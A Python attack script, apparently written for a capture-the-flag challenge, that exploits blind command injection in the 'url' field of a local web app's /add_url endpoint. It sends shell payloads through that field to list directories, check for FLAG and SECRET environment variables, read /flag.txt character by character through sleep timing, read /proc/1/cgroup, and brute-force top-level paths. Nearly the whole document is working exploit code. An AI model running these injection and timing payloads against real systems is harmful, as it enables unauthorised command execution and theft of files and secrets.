import requests
import time

base_url = "http://127.0.0.1:32998"
add_url = f"{base_url}/add_url"

print("="*60)
print("FINAL ATTEMPT - DIFFERENT APPROACHES")
print("="*60)

# Try different techniques for data exfiltration or file discovery

# 1. Try to write command output to a file we might be able to access
print("\n[*] Trying to write command output to accessible location...")

# Run command and save to /tmp, then check if file exists
test_payload = "$(ls / > /tmp/ls_output.txt 2>/dev/null)"
requests.post(add_url, data={"url": test_payload}, timeout=5)
time.sleep(0.5)

# Then try to use that output somehow
test_payload = "$(cat /tmp/ls_output.txt 2>/dev/null | wc -l)"
start = time.time()
requests.post(add_url, data={"url": test_payload}, timeout=5)
elapsed = time.time() - start
print(f"  Lines in ls output: ~{int(elapsed)} (if file exists)")

# 2. Try environment variables
print("\n[*] Checking environment variables...")
env_vars = ["HOME", "PWD", "USER", "PATH", "HOSTNAME", "FLAG", "SECRET"]

for var in env_vars:
    payload = f"$[ ${var} != '' ] && sleep 2"
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=5)
        elapsed = time.time() - start
        if elapsed > 1.5:
            print(f"  [+] {var} is set")
        else:
            print(f"  [-] {var} not set or empty")
    except:
        pass

# 3. Try to use shell's printf to get character codes
print("\n[*] Trying to extract data via character codes...")

# If flag exists at /flag.txt, try to get first char ASCII value
payload = "first=$(head -c1 /flag.txt 2>/dev/null); [ -n \"$first\" ] && sleep $(printf '%d' \"'$first\") 2>/dev/null || sleep 0"
start = time.time()
try:
    resp = requests.post(add_url, data={"url": payload}, timeout=10)
    elapsed = time.time() - start
    if elapsed > 0.1:
        ascii_val = int(elapsed) if elapsed < 5 else 0
        if ascii_val > 0:
            char = chr(ascii_val)
            print(f"  [!] First character ASCII: {ascii_val} = '{char}'")
        else:
            print(f"  Delay detected: {elapsed:.2f}s (but value unclear)")
    else:
        print(f"  No delay: {elapsed:.2f}s (file probably doesn't exist)")
except Exception as e:
    print(f"  Error: {e}")

# 4. Simple - just try to cat flag and see if URL validator accepts it (longer URL = longer processing?)
print("\n[*] Trying direct cat with URL-formatted output...")

payload = "$(cat /flag.txt 2>/dev/null | head -c100)"
start = time.time()
resp = requests.post(add_url, data={"url": payload}, timeout=5)
elapsed = time.time() - start
print(f"  Response time: {elapsed:.2f}s")
print(f"  Response: {resp.text[:100]}")

# 5. Check if we're in a container with limited filesystem
print("\n[*] Checking system info...")

payload = "$(cat /proc/1/cgroup 2>/dev/null | head -1)"
start = time.time()
resp = requests.post(add_url, data={"url": payload}, timeout=5)
elapsed = time.time() - start
# Check if response time is longer (meaning output was processed)
print(f"  CGROUP check time: {elapsed:.2f}s (if > 0.5s, cgroup info exists)")

# 6. Last resort - try ALL single-letter directories and common variations
print("\n[*] Brute force /X directories...")

found_dirs = []
for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-":
    path = f"/{char}"
    payload = f"[ -d {path} ] && sleep 1"
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=5)
        elapsed = time.time() - start
        if elapsed > 0.8:
            found_dirs.append(path)
    except:
        elapsed = time.time() - start
        if elapsed > 0.8:
            found_dirs.append(path)

print(f"  Found top-level directories: {found_dirs if found_dirs else 'None detected'}")

print("\n" + "="*60)
print("ENUMERATION COMPLETE")
print("="*60)
print("Command injection confirmed via `sleep` and $(sleep) payloads.")
print("However, no flag files found in standard or custom locations.")
print("The target may be a restricted/containerized environment.")

